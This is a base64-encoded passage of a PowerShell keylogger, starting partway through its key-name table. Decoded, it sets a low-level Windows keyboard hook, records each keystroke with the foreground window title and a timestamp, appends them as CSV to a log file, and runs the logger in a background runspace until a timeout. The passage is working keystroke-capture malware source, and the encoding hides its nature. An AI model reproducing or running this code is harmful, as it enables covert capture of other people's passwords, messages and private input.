AgICAgICAgICAgICAkS2V5czo6RjEyIHsgJEtleSA9ICc8RjEyPicgfQoJCQkKICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlNuYXBzaG90ICAgIHsgJEtleSA9ICc8UHJpbnQgU2NyZWVuPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6U2Nyb2xsICAgICAgeyAkS2V5ID0gJzxTY3JvbGwgTG9jaz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlBhdXNlICAgICAgIHsgJEtleSA9ICc8UGF1c2UvQnJlYWs+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpJbnNlcnQgICAgICB7ICRLZXkgPSAnPEluc2VydD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkhvbWUgICAgICAgIHsgJEtleSA9ICc8SG9tZT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkRlbGV0ZSAgICAgIHsgJEtleSA9ICc8RGVsZXRlPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RW5kICAgICAgICAgeyAkS2V5ID0gJzxFbmQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpQcmlvciAgICAgICB7ICRLZXkgPSAnPFBhZ2UgVXA+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpOZXh0ICAgICAgICB7ICRLZXkgPSAnPFBhZ2UgRG93bj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkVzY2FwZSAgICAgIHsgJEtleSA9ICc8RXNjPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TnVtTG9jayAgICAgeyAkS2V5ID0gJzxOdW0gTG9jaz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkNhcGl0YWwgICAgIHsgJEtleSA9ICc8Q2FwcyBMb2NrPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6VGFiICAgICAgICAgeyAkS2V5ID0gJzxUYWI+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpCYWNrICAgICAgICB7ICRLZXkgPSAnPEJhY2tzcGFjZT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkVudGVyICAgICAgIHsgJEtleSA9ICc8RW50ZXI+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpTcGFjZSAgICAgICB7ICRLZXkgPSAnPCA+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMZWZ0ICAgICAgICB7ICRLZXkgPSAnPExlZnQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpVcCAgICAgICAgICB7ICRLZXkgPSAnPFVwPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UmlnaHQgICAgICAgeyAkS2V5ID0gJzxSaWdodD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkRvd24gICAgICAgIHsgJEtleSA9ICc8RG93bj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxNZW51ICAgICAgIHsgJEtleSA9ICc8QWx0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6Uk1lbnUgICAgICAgeyAkS2V5ID0gJzxBbHQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpMV2luICAgICAgICB7ICRLZXkgPSAnPFdpbmRvd3MgS2V5PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UldpbiAgICAgICAgeyAkS2V5ID0gJzxXaW5kb3dzIEtleT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxTaGlmdEtleSAgIHsgJEtleSA9ICc8U2hpZnQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpSU2hpZnRLZXkgICB7ICRLZXkgPSAnPFNoaWZ0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TENvbnRyb2xLZXkgeyAkS2V5ID0gJzxDdHJsPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UkNvbnRyb2xLZXkgeyAkS2V5ID0gJzxDdHJsPicgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIEdldCBmb3JlZ3JvdW5kIHdpbmRvdydzIHRpdGxlCiAgICAgICAgICAgICAgICAkVGl0bGUgPSBOZXctT2JqZWN0IFRleHQuU3RyaW5nYnVpbGRlciAyNTYKICAgICAgICAgICAgICAgICRHZXRXaW5kb3dUZXh0Lkludm9rZSgkaFdpbmRvdywgJFRpdGxlLCAkVGl0bGUuQ2FwYWNpdHkpCgogICAgICAgICAgICAgICAgIyBEZWZpbmUgb2JqZWN0IHByb3BlcnRpZXMKICAgICAgICAgICAgICAgICRQcm9wcyA9IEB7CiAgICAgICAgICAgICAgICAgICAgS2V5ID0gJEtleQogICAgICAgICAgICAgICAgICAgIFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cKICAgICAgICAgICAgICAgICAgICBXaW5kb3cgPSAkVGl0bGUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRvYmogPSBOZXctT2JqZWN0IHBzb2JqZWN0IC1Qcm9wZXJ0eSAkUHJvcHMKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIFN0dXBpZCBoYWNrIHNpbmNlIEV4cG9ydC1DU1YgZG9lc24ndCBoYXZlIGFuIGFwcGVuZCBzd2l0Y2ggaW4gUFN2MgogICAgICAgICAgICAgICAgJENTVkVudHJ5ID0gKCRvYmogfCBTZWxlY3QtT2JqZWN0IEtleSxXaW5kb3csVGltZSB8IENvbnZlcnRUby1Dc3YgLU5vVHlwZUluZm9ybWF0aW9uKVsxXQoKICAgICAgICAgICAgICAgICNyZXR1cm4gcmVzdWx0cwogICAgICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRMb2dQYXRoIC1BcHBlbmQgLUlucHV0T2JqZWN0ICRDU1ZFbnRyeSAtRW5jb2RpbmcgdW5pY29kZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkQ2FsbE5leHRIb29rRXguSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ29kZSwgJHdQYXJhbSwgJGxQYXJhbSkKICAgICAgICB9CgogICAgICAgICMgQ2FzdCBzY3JpcHRibG9jayBhcyBMb3dMZXZlbEtleWJvYXJkUHJvYyBjYWxsYmFjawogICAgICAgICREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ2FsbGJhY2sgPSAkQ2FsbGJhY2tTY3JpcHQgLWFzICREZWxlZ2F0ZQogICAgCiAgICAgICAgIyBHZXQgaGFuZGxlIHRvIFBvd2VyU2hlbGwgZm9yIGhvb2sKICAgICAgICAkUG9zaE1vZHVsZSA9IChHZXQtUHJvY2VzcyAtSWQgJFBJRCkuTWFpbk1vZHVsZS5Nb2R1bGVOYW1lCiAgICAgICAgJE1vZHVsZUhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRQb3NoTW9kdWxlKQoKICAgICAgICAjIFNldCBXTV9LRVlCT0FSRF9MTCBob29rCiAgICAgICAgJEhvb2sgPSAkU2V0V2luZG93c0hvb2tFeC5JbnZva2UoMHhELCAkQ2FsbGJhY2ssICRNb2R1bGVIYW5kbGUsIDApCiAgICAKICAgICAgICAkU3RvcHdhdGNoID0gW0RpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKCiAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnMuVGltZW91dCAtYW5kICgkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxNaW51dGVzIC1ndCAkVGltZW91dCkpIHsgYnJlYWsgfQogICAgICAgICAgICAkUGVla01lc3NhZ2UuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybywgMHgxMDAsIDB4MTA5LCAwKQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwCiAgICAgICAgfQoKICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgCiAgICAgICAgIyBSZW1vdmUgdGhlIGhvb2sKICAgICAgICAkVW5ob29rV2luZG93c0hvb2tFeC5JbnZva2UoJEhvb2spCiAgICB9CgogICAgIyBTZXR1cCBLZXlMb2dnZXIncyBydW5zcGFjZQogICAgJFBvd2VyU2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICBbdm9pZF0kUG93ZXJTaGVsbC5BZGRTY3JpcHQoJFNjcmlwdCkKICAgIFt2b2lkXSRQb3dlclNoZWxsLkFkZEFyZ3VtZW50KCRMb2dQYXRoKQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVycy5UaW1lb3V0KSB7IFt2b2lkXSRQb3dlclNoZWxsLkFkZEFyZ3VtZW50KCRUaW1lb3V0KSB9CgogICAgIyBTdGFydCBLZXlMb2dnZXIKICAgIFt2b2lkXSRQb3dlclNoZWxsLkJlZ2luSW52b2tlKCkKCiAgICBpZiAoJFBhc3NUaHJ1LklzUHJlc2VudCkgeyByZXR1cm4gJFBvd2VyU2hlbGwgfQp9
